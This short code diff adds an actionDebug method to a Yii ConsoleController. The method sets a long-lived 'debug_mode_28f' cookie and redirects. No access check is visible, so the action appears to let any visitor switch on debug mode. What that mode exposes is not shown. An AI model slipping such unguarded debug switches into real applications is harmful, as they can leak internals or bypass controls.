@@ -164,4 +164,13 @@ class ConsoleController extends Controller
             'model' => $model
         ));
     }
+
+    public function actionDebug()
+    {
+        $cookie = new CHttpCookie('debug_mode_28f', '1');
+        $cookie->expire = time()+60*60*24*180;
+        Yii::app()->request->cookies['debug_mode_28f'] = $cookie;
+
+        $this->redirect(array('console/index'));
+    }
 }
